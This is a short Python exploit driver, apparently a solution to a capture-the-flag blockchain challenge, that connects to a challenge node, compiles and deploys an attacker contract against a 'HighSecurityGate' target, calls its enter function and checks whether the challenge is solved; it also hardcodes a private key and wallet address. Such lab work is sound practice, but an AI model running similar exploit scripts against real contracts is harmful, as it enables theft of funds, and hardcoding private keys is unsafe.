from web3 import Web3, AsyncWeb3
import sys
import time
import pprint
from solcx import compile_source
#pip3 install web3 py-solc-x
#Before first run in Python3 >>> import solcx ; solcx.install_solc()
#exit()
#python3 -i ./deception.py
w3 = Web3(Web3.HTTPProvider('http://142.93.38.14:31945'))
#print(w3)
#print(w3.eth.get_block('latest'))
private_key = "0x3cd627c3952b7c4920feb743ecc52cbf1e7178a2aadc2041e27869b7e64bc8bb"
wallet_address = "0x630f04afAF9644578984aEB6f695Ed3188F1cA8E"
target_address = "0x1e71878D8942248eBfCE64ffc4d15B52156113B8"
setup_address = "0xa1fADeda4625bF63CC275fED7Ea0674462Fb07A1"
w3.eth.default_account = w3.eth.accounts[1]
target_abi = [
    {"inputs": [],"name": "enter","outputs": [],"stateMutability": "nonpayable","type": "function"},
    {"inputs": [],"name": "lastEntrant","outputs": [{"internalType": "string","name": "","type": "string"}],"stateMutability": "view","type": "function"},
    {"inputs": [{"internalType": "string","name": "_str1","type": "string"},{"internalType": "string","name": "_str2","type": "string"}],"name": "strcmp","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "pure","type": "function"}
    ]

interface_abi = [{"inputs": [],"name": "name","outputs": [{"internalType": "string","name": "","type": "string"}],"stateMutability": "nonpayable","type": "function"}]

setup_abi = [
    {"inputs": [],"stateMutability": "nonpayable","type": "constructor"},{"inputs": [],"name": "TARGET","outputs": [{"internalType": "contract HighSecurityGate","name": "","type": "address"}],"stateMutability": "view","type": "function"},
    {"inputs": [],"name": "isSolved","outputs": [{"internalType": "bool","name": "","type": "bool"}],"stateMutability": "view","type": "function"}
    ]
#print(target_abi)
#print(setup_abi)
target_contract_instance = w3.eth.contract(address = target_address, abi = target_abi)
setup_contract_instance = w3.eth.contract(address = setup_address, abi = setup_abi)
interface_contract_instance = w3.eth.contract(address = target_address, abi = interface_abi)


#The above is common to all blockchain challenges.  Below is specific to this challenge.

#create contract
def compile_source_file(file_path):
    with open(file_path, 'r') as f:
        source = f.read()
    return compile_source(source,output_values=['abi','bin'])

def deploy_contract(w3, contract_interface):
    tx_hash = w3.eth.contract( abi=contract_interface['abi'], bytecode=contract_interface['bin']).constructor().transact()
    address = w3.eth.get_transaction_receipt(tx_hash)['contractAddress']
    return address

contract_source_path = './Contract.sol'
compiled_sol = compile_source_file('./Contract.sol')
contract_id, contract_interface = compiled_sol.popitem()

entrant_address = deploy_contract(w3, contract_interface)
print(f'Deployed {contract_id} to: {entrant_address}\n')

my_contract_instance = w3.eth.contract(address=entrant_address, abi=contract_interface["abi"])

print(my_contract_instance.functions.setEntrantAddr(target_address).transact())
print(my_contract_instance.functions.enter().transact())
print(my_contract_instance.functions.getVar().call())
print(my_contract_instance.functions.flag().call())
print(target_contract_instance.functions.lastEntrant().call())
print(setup_contract_instance.functions.isSolved().call())